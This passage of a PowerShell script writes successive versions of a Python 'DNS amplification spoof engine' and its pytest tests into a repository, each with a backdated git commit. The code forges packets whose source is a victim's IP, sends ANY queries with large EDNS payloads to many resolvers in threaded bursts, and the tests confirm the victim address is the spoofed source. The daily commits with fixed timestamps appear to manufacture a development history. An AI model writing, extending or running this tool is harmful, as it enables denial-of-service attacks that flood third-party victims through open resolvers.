import time as _time_module

from scapy.all import send as scapy_send
from scapy.layers.dns import DNS, DNSQR, DNSRROPT
from scapy.layers.inet import IP, UDP

QTYPE_MAP = {
    'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
    'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
    'MX': 15, 'SRV': 33, 'NAPTR': 35, 'CAA': 257,
}


def _make_txid(txid, id_random):
    return _random.randint(0, 0xFFFF) if id_random else txid


def _time_sleep(s):
    _time_module.sleep(s)


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )


def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
                           victim_src_port=53, qtype='ANY', edns_payload=4096,
                           dnssec_do=False, txid=0x1337, id_random=False,
                           verbose=False, measure=False, qclass=1):
    """Send one spoofed DNS query; resolver replies flow to victim_ip."""
    txid_val = _make_txid(txid, id_random)
    qtype_int = QTYPE_MAP.get(qtype.upper(), 1)
    question = DNSQR(qname=domain.strip('.'), qtype=qtype_int, qclass=qclass)
    if edns_payload > 0:
        do_flag = 0x8000 if dnssec_do else 0
        opt = DNSRROPT(rrname='.', type=41, rclass=edns_payload, z=do_flag)
        pkt_dns = DNS(id=txid_val, rd=1, qd=question, ar=opt)
    else:
        pkt_dns = DNS(id=txid_val, rd=1, qd=question)
    pkt = IP(src=victim_ip, dst=resolver_ip) / UDP(sport=victim_src_port, dport=resolver_port) / pkt_dns
    if verbose:
        print(f"Spoofed: {victim_ip}:{victim_src_port} -> {resolver_ip}:{resolver_port} qtype={qtype} domain={domain}")
        if measure:
            print(f"Query size: {len(pkt)} bytes")
    scapy_send(pkt, verbose=False)


def send_spoofed_queries_through_resolvers(domain, resolvers, resolver_port,
                                           victim_ip, victim_src_port=53,
                                           num_queries=1, interval=1.0,
                                           qtype='ANY', edns_payload=4096,
                                           dnssec_do=False, txid=0x1337,
                                           id_random=False, verbose=False,
                                           measure=False, burst=False,
                                           qclass=1):
    pass
'@
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-24T10:39:04" "feat: add send_spoofed_queries_through_resolvers skeleton"

# Commit 27: Mar 25 - thread spawning loop
$se = @'
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy."""

import os
import random as _random
import sys
import threading as _threading
import time as _time_module

from scapy.all import send as scapy_send
from scapy.layers.dns import DNS, DNSQR, DNSRROPT
from scapy.layers.inet import IP, UDP

QTYPE_MAP = {
    'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
    'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
    'MX': 15, 'SRV': 33, 'NAPTR': 35, 'CAA': 257,
}


def _make_txid(txid, id_random):
    return _random.randint(0, 0xFFFF) if id_random else txid


def _time_sleep(s):
    _time_module.sleep(s)


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )


def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
                           victim_src_port=53, qtype='ANY', edns_payload=4096,
                           dnssec_do=False, txid=0x1337, id_random=False,
                           verbose=False, measure=False, qclass=1):
    """Send one spoofed DNS query; resolver replies flow to victim_ip."""
    txid_val = _make_txid(txid, id_random)
    qtype_int = QTYPE_MAP.get(qtype.upper(), 1)
    question = DNSQR(qname=domain.strip('.'), qtype=qtype_int, qclass=qclass)
    if edns_payload > 0:
        do_flag = 0x8000 if dnssec_do else 0
        opt = DNSRROPT(rrname='.', type=41, rclass=edns_payload, z=do_flag)
        pkt_dns = DNS(id=txid_val, rd=1, qd=question, ar=opt)
    else:
        pkt_dns = DNS(id=txid_val, rd=1, qd=question)
    pkt = IP(src=victim_ip, dst=resolver_ip) / UDP(sport=victim_src_port, dport=resolver_port) / pkt_dns
    if verbose:
        print(f"Spoofed: {victim_ip}:{victim_src_port} -> {resolver_ip}:{resolver_port} qtype={qtype} domain={domain}")
        if measure:
            print(f"Query size: {len(pkt)} bytes")
    scapy_send(pkt, verbose=False)


def send_spoofed_queries_through_resolvers(domain, resolvers, resolver_port,
                                           victim_ip, victim_src_port=53,
                                           num_queries=1, interval=1.0,
                                           qtype='ANY', edns_payload=4096,
                                           dnssec_do=False, txid=0x1337,
                                           id_random=False, verbose=False,
                                           measure=False, burst=False,
                                           qclass=1):
    threads = []
    for resolver in resolvers:
        for _ in range(num_queries):
            t = _threading.Thread(
                target=send_spoofed_dns_query,
                args=(domain, resolver, resolver_port, victim_ip,
                      victim_src_port, qtype, edns_payload, dnssec_do,
                      txid, id_random, verbose, measure, qclass))
            threads.append(t)
            t.start()
'@
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-25T10:39:04" "feat: add thread spawning loop in resolver function"

# Commit 28: Mar 26 - burst mode
$se = @'
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy."""

import os
import random as _random
import sys
import threading as _threading
import time as _time_module

from scapy.all import send as scapy_send
from scapy.layers.dns import DNS, DNSQR, DNSRROPT
from scapy.layers.inet import IP, UDP

QTYPE_MAP = {
    'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
    'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
    'MX': 15, 'SRV': 33, 'NAPTR': 35, 'CAA': 257,
}


def _make_txid(txid, id_random):
    return _random.randint(0, 0xFFFF) if id_random else txid


def _time_sleep(s):
    _time_module.sleep(s)


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )


def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
                           victim_src_port=53, qtype='ANY', edns_payload=4096,
                           dnssec_do=False, txid=0x1337, id_random=False,
                           verbose=False, measure=False, qclass=1):
    """Send one spoofed DNS query; resolver replies flow to victim_ip."""
    txid_val = _make_txid(txid, id_random)
    qtype_int = QTYPE_MAP.get(qtype.upper(), 1)
    question = DNSQR(qname=domain.strip('.'), qtype=qtype_int, qclass=qclass)
    if edns_payload > 0:
        do_flag = 0x8000 if dnssec_do else 0
        opt = DNSRROPT(rrname='.', type=41, rclass=edns_payload, z=do_flag)
        pkt_dns = DNS(id=txid_val, rd=1, qd=question, ar=opt)
    else:
        pkt_dns = DNS(id=txid_val, rd=1, qd=question)
    pkt = IP(src=victim_ip, dst=resolver_ip) / UDP(sport=victim_src_port, dport=resolver_port) / pkt_dns
    if verbose:
        print(f"Spoofed: {victim_ip}:{victim_src_port} -> {resolver_ip}:{resolver_port} qtype={qtype} domain={domain}")
        if measure:
            print(f"Query size: {len(pkt)} bytes")
    scapy_send(pkt, verbose=False)


def send_spoofed_queries_through_resolvers(domain, resolvers, resolver_port,
                                           victim_ip, victim_src_port=53,
                                           num_queries=1, interval=1.0,
                                           qtype='ANY', edns_payload=4096,
                                           dnssec_do=False, txid=0x1337,
                                           id_random=False, verbose=False,
                                           measure=False, burst=False,
                                           qclass=1):
    threads = []
    for resolver in resolvers:
        for _ in range(num_queries):
            t = _threading.Thread(
                target=send_spoofed_dns_query,
                args=(domain, resolver, resolver_port, victim_ip,
                      victim_src_port, qtype, edns_payload, dnssec_do,
                      txid, id_random, verbose, measure, qclass))
            threads.append(t)
            t.start()
            if not burst:
                _time_sleep(interval)
'@
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-26T10:39:04" "feat: add burst mode to resolver thread spawning"

# Commit 29: Mar 27 - thread.join()
$se = @'
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy."""

import os
import random as _random
import sys
import threading as _threading
import time as _time_module

from scapy.all import send as scapy_send
from scapy.layers.dns import DNS, DNSQR, DNSRROPT
from scapy.layers.inet import IP, UDP

QTYPE_MAP = {
    'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
    'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
    'MX': 15, 'SRV': 33, 'NAPTR': 35, 'CAA': 257,
}


def _make_txid(txid, id_random):
    return _random.randint(0, 0xFFFF) if id_random else txid


def _time_sleep(s):
    _time_module.sleep(s)


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )


def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
                           victim_src_port=53, qtype='ANY', edns_payload=4096,
                           dnssec_do=False, txid=0x1337, id_random=False,
                           verbose=False, measure=False, qclass=1):
    """Send one spoofed DNS query; resolver replies flow to victim_ip."""
    txid_val = _make_txid(txid, id_random)
    qtype_int = QTYPE_MAP.get(qtype.upper(), 1)
    question = DNSQR(qname=domain.strip('.'), qtype=qtype_int, qclass=qclass)
    if edns_payload > 0:
        do_flag = 0x8000 if dnssec_do else 0
        opt = DNSRROPT(rrname='.', type=41, rclass=edns_payload, z=do_flag)
        pkt_dns = DNS(id=txid_val, rd=1, qd=question, ar=opt)
    else:
        pkt_dns = DNS(id=txid_val, rd=1, qd=question)
    pkt = IP(src=victim_ip, dst=resolver_ip) / UDP(sport=victim_src_port, dport=resolver_port) / pkt_dns
    if verbose:
        print(f"Spoofed: {victim_ip}:{victim_src_port} -> {resolver_ip}:{resolver_port} qtype={qtype} domain={domain}")
        if measure:
            print(f"Query size: {len(pkt)} bytes")
    scapy_send(pkt, verbose=False)


def send_spoofed_queries_through_resolvers(domain, resolvers, resolver_port,
                                           victim_ip, victim_src_port=53,
                                           num_queries=1, interval=1.0,
                                           qtype='ANY', edns_payload=4096,
                                           dnssec_do=False, txid=0x1337,
                                           id_random=False, verbose=False,
                                           measure=False, burst=False,
                                           qclass=1):
    threads = []
    for resolver in resolvers:
        for _ in range(num_queries):
            t = _threading.Thread(
                target=send_spoofed_dns_query,
                args=(domain, resolver, resolver_port, victim_ip,
                      victim_src_port, qtype, edns_payload, dnssec_do,
                      txid, id_random, verbose, measure, qclass))
            threads.append(t)
            t.start()
            if not burst:
                _time_sleep(interval)
    for t in threads:
        t.join()
'@
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-27T10:39:04" "feat: add thread.join() to wait for all resolver threads"

# Commit 30: Mar 28 - test: resolver fires all
$t = @'
import pytest
import sys
import os
import threading
from unittest.mock import patch

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))


def test_check_root_raises_on_non_root(monkeypatch):
    import spoof_engine
    monkeypatch.setattr(spoof_engine, '_is_root', lambda: False)
    with pytest.raises(PermissionError, match="root"):
        spoof_engine.check_root()


def test_check_root_passes_as_root(monkeypatch):
    import spoof_engine
    monkeypatch.setattr(spoof_engine, '_is_root', lambda: True)
    spoof_engine.check_root()


def test_send_spoofed_dns_query_calls_scapy_send():
    import spoof_engine
    sent = []
    with patch('spoof_engine.scapy_send', side_effect=lambda p, verbose: sent.append(p)):
        spoof_engine.send_spoofed_dns_query(
            domain='example.com', resolver_ip='8.8.8.8', resolver_port=53,
            victim_ip='1.2.3.4', victim_src_port=53, qtype='ANY',
            edns_payload=4096, txid=0x1337, id_random=False)
    assert len(sent) == 1


def test_victim_ip_is_packet_source():
    import spoof_engine
    from scapy.layers.inet import IP
    captured = []
    with patch('spoof_engine.scapy_send', side_effect=lambda p, verbose: captured.append(p)):
        spoof_engine.send_spoofed_dns_query(
            domain='example.com', resolver_ip='8.8.8.8', resolver_port=53,
            victim_ip='5.5.5.5', victim_src_port=53)
    assert captured[0][IP].src == '5.5.5.5'
    assert captured[0][IP].dst == '8.8.8.8'


def test_resolver_loop_fires_all_threads():
    import spoof_engine
    lock = threading.Lock()
    count = []
    def fake_send(p, verbose):
        with lock:
            count.append(1)
    with patch('spoof_engine.scapy_send', side_effect=fake_send):
        spoof_engine.send_spoofed_queries_through_resolvers(
            domain='example.com', resolvers=['1.1.1.1', '8.8.8.8'],
            resolver_port=53, victim_ip='1.2.3.4', num_queries=3,
            interval=0, burst=True)
    assert len(count) == 6
'@
[System.IO.File]::WriteAllText("$repo\tests\test_spoof_engine.py", $t)
DoCommit "2026-03-28T10:39:04" "test: add test resolver loop fires all threads"

# Commit 31: Mar 29 - test: burst skips sleep
$t = @'
import pytest
import sys
import os
import threading
from unittest.mock import patch

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))


def test_check_root_raises_on_non_root(monkeypatch):
    import spoof_engine
    monkeypatch.setattr(spoof_engine, '_is_root', lambda: False)
    with pytest.raises(PermissionError, match="root"):
        spoof_engine.check_root()


def test_check_root_passes_as_root(monkeypatch):
    import spoof_engine
    monkeypatch.setattr(spoof_engine, '_is_root', lambda: True)
    spoof_engine.check_root()


def test_send_spoofed_dns_query_calls_scapy_send():
    import spoof_engine
    sent = []
    with patch('spoof_engine.scapy_send', side_effect=lambda p, verbose: sent.append(p)):
        spoof_engine.send_spoofed_dns_query(
            domain='example.com', resolver_ip='8.8.8.8', resolver_port=53,
            victim_ip='1.2.3.4', victim_src_port=53, qtype='ANY',
            edns_payload=4096, txid=0x1337, id_random=False)
    assert len(sent) == 1


def test_victim_ip_is_packet_source():
    import spoof_engine
    from scapy.layers.inet import IP
    captured = []
    with patch('spoof_engine.scapy_send', side_effect=lambda p, verbose: captured.append(p)):
        spoof_engine.send_spoofed_dns_query(
            domain='example.com', resolver_ip='8.8.8.8', resolver_port=53,
            victim_ip='5.5.5.5', victim_src_port=53)
    assert captured[0][IP].src == '5.5.5.5'
    assert captured[0][IP].dst == '8.8.8.8'


def test_resolver_loop_fires_all_threads():
    import spoof_engine
    lock = threading.Lock()
    count = []
    def fake_send(p, verbose):
        with lock:
            count.append(1)
    with patch('spoof_engine.scapy_send', side_effect=fake_send):
        spoof_engine.send_spoofed_queries_through_resolvers(
            domain='example.com', resolvers=['1.1.1.1', '8.8.8.8'],
            resolver_port=53, victim_ip='1.2.3.4', num_queries=3,
            interval=0, burst=True)
    assert len(count) == 6


def test_burst_mode_skips_sleep():
    import spoof_engine
    sleeps = []
    with patch('spoof_engine.scapy_send', return_value=None), \
         patch('spoof_engine._time_sleep', side_effect=sleeps.append):
        spoof_engine.send_spoofed_queries_through_resolvers(
            domain='example.com', resolvers=['1.1.1.1'],
            resolver_port=53, victim_ip='1.2.3.4',
            num_queries=2, interval=0.01, burst=True)
    assert len(sleeps) == 0
'@
[System.IO.File]::WriteAllText("$repo\tests\test_spoof_engine.py", $t)
DoCommit "2026-03-29T10:39:04" "test: add test burst mode skips sleep calls"

# Commit 32: Mar 30 - refactor: add threads.clear() after join
$se = (Get-Content "$repo\spoof_engine.py" -Raw) -replace "    for t in threads:`r?`n        t.join\(\)", "    for t in threads:`n        t.join()`n    threads.clear()"
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-30T10:39:04" "refactor: clear threads list after join completes"

# Commit 33: Mar 31 - fix: handle empty resolver list
$se = (Get-Content "$repo\spoof_engine.py" -Raw) -replace "    threads = \[\]", "    if not resolvers:`n        return`n    threads = []"
[System.IO.File]::WriteAllText("$repo\spoof_engine.py", $se)
DoCommit "2026-03-31T10:39:04" "fix: handle empty resolver list without exception"

# Push March
git push
Write-Host "MARCH DONE - pushed" -ForegroundColor Cyan
